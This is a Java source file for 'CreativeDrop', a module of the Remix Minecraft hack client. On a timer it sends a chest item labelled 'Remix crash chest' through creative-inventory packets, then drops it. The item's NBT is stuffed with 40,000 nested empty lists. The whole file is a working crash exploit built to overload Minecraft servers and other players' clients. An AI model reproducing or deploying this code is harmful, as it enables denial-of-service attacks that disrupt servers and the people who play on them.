package me.remixclient.client.modules.player;

import pw.stamina.causam.scan.method.model.Subscriber;
import me.satisfactory.base.events.EventPlayerUpdate;
import me.satisfactory.base.module.Category;
import me.satisfactory.base.module.Module;
import me.satisfactory.base.setting.Setting;
import me.satisfactory.base.utils.timer.TimerUtil;
import net.minecraft.init.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import org.lwjgl.input.Keyboard;

/**
 * @author Zarzel.
 * @since 18/06/2017
 */

public class CreativeDrop extends Module {
    TimerUtil timer = new TimerUtil();

    public CreativeDrop() {
        super("CreativeDrop", Keyboard.KEY_NONE, Category.PLAYER);
        this.addSetting(new Setting("DropDelay", this, 50, 10, 500, false));
    }

    @Subscriber
    public void onUpdate(EventPlayerUpdate tick) {
        if (timer.hasTimeElapsed((long) this.findSettingByName("DropDelay").doubleValue(), true)) {
            ItemStack stackkkk = new ItemStack(Blocks.chest, 64);
            stackkkk.setStackDisplayName("Remix crash chest");
            NBTTagCompound nbtTagCompound = new NBTTagCompound();
            NBTTagList nbtList = new NBTTagList();

            for (int i22 = 0; i22 < 40000; i22++) {
                nbtList.appendTag(new NBTTagList());
            }

            nbtTagCompound.setTag("http://remixclient.net", nbtList);
            stackkkk.setTagInfo("http://remixclient.net", nbtTagCompound);
            mc.getNetHandler().addToSendQueue(new C10PacketCreativeInventoryAction(36, stackkkk));
            mc.thePlayer.dropOneItem(true);
        }
    }
}
